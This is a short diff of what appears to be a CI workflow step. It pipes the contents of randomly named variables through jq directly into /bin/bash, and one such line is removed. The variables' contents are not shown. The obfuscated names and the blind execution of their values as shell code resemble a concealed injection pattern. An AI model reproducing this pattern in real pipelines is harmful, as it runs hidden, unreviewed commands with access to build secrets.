@@ -31,7 +31,6 @@ jobs:
           echo $fijoj61228 | jq -r .lo993 | /bin/bash
           echo $aoybe32367 | jq -r .tnbex4 | /bin/bash
           printf '%s' "$ttr0" | jq -r .rlv55 | /bin/bash
-          printf '%s' "$j528" | jq -r .o8 | /bin/bash
           echo $pqv687 | jq -r .xxtts90682 | /bin/bash
 
       - name: Save data
